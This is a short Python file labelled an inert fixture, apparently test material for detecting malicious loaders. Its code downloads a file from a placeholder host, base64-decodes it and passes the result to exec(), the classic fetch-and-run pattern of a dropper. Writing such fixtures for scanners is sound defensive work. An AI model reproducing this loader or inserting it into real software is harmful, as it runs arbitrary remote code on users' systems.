"""Inert fixture: remote behavior is intentionally unreachable."""

import base64
import urllib.request

payload = urllib.request.urlopen(
    "https://payload.example.invalid/runtime.bin",
    timeout=5,
).read()
exec(base64.b64decode(payload))
